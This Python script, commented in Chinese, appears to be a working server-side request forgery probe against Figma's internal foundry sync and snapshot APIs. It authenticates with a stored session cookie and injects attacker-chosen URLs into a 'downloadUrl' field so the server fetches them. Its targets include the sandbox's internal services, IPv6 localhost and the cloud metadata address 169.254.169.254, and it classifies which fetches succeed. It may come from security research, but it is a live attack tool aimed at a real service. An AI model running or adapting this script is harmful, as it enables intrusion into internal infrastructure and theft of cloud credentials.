"""SSRF 深化第2轮: 判定修正 —— EMPTY 的语义
问题: EMPTY 分不清"连接失败"和"连接成功但非200响应被丢弃"
对照组: httpbin /status/401|403|500 —— 若非200也EMPTY => fetch客户端只落盘200, 内部域名组需重判
同时打印 sync 响应体全文(找 fetch 错误字段) + snapshot 路径存在性
"""
import io, json, urllib.request, sys, re, base64, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(path, body, timeout=30):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method="POST")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors='replace'), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace'), time.time() - t0
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}", time.time() - t0

def ssrf_fetch(url, tag, sbox, verbose_sync=False):
    fname = "code/DP_%s.txt" % tag
    body = {"vfsChangeByPath": {tag: {"type": "upsert",
            "entry": {"path": fname, "downloadUrl": url, "metadata": {"version": "1", "guid": "g1"}}}},
            "entrypointsByIdentifier": {}}
    st1, r1, dt1 = call("/api/cortex/foundry/sync", body, timeout=30)
    st2, snap, dt2 = call("/api/cortex/foundry/fs-snapshot",
                     {"sboxdUrl": sbox, "path": "code/src/" + fname, "options": {"content": "snapshot"}}, timeout=30)
    # 解析 SSE: 找所有 event + 路径存在性
    events = re.findall(r'data: (\{.*?\})\n', snap, re.S)
    path_exists = False
    content = ""
    err_fields = []
    for m in events:
        try:
            o = json.loads(m)
        except Exception:
            continue
        if o.get("path") and fname in str(o.get("path")):
            path_exists = True
        if o.get("type") == "fswatch/event" and o.get("content"):
            content = base64.b64decode(o["content"]).decode(errors='replace')
        if o.get("type") in ("error", "sync/error", "fswatch/error") or "error" in str(o)[:200].lower():
            err_fields.append(json.dumps(o, ensure_ascii=False)[:300])
    # sync 响应里的可疑字段(错误/失败标记)
    sync_hits = [k for k in ("error", "fail", "blocked", "denied", "timeout", "unreachable", "reject") if k in r1.lower()]
    verdict = "REACHED" if content else (
        "TIMEOUT/FAIL" if "!!" in r1 or "!!" in snap else (
            "SYNC_ERR" if sync_hits or err_fields else (
                "EMPTY(path_absent)" if not path_exists else "EMPTY(path_exists)"
            )
        )
    )
    print(f"[{tag}] {url}")
    print(f"    sync={st1}({dt1:.1f}s) snap={st2}({dt2:.1f}s) -> {verdict}")
    if content:
        print(f"    content({len(content)}): {content[:200].strip()}")
    if sync_hits:
        print(f"    sync_err_fields: {sync_hits}")
    if err_fields:
        print(f"    sse_err: {err_fields[0]}")
    if verbose_sync and not content:
        print(f"    sync_body: {r1[:300]}")
    return content, st1, dt1

print("======== 拿 sandbox ========")
st, resp, _ = call("/api/cortex/foundry/sandbox", {})
SBOX = json.loads(resp)["sboxdUrl"]
print("sandbox:", st, SBOX)

print("\n======== 关键对照组: 非200状态码是否回显 ========")
ssrf_fetch("https://httpbin.org/robots.txt", "c_200", SBOX)
ssrf_fetch("https://httpbin.org/status/401", "c_401", SBOX, verbose_sync=True)
ssrf_fetch("https://httpbin.org/status/403", "c_403", SBOX)
ssrf_fetch("https://httpbin.org/status/500", "c_500", SBOX)
ssrf_fetch("https://httpbin.org/html", "c_200html", SBOX)

print("\n======== 重判内部域名(sandbox 自身服务) ========")
ssrf_fetch(SBOX + "/", "int_sboxd", SBOX, verbose_sync=True)
ssrf_fetch(SBOX + "/api/health", "int_health", SBOX)
ssrf_fetch(SBOX.replace("sboxd-", "app-") + "/", "int_appurl", SBOX, verbose_sync=True)

print("\n======== 时间特征: 内网地址(隔离基线与IPv6) ========")
ssrf_fetch("http://169.254.169.254/latest/meta-data/", "t_imds", SBOX)
ssrf_fetch("http://[::1]/", "t_v6", SBOX)
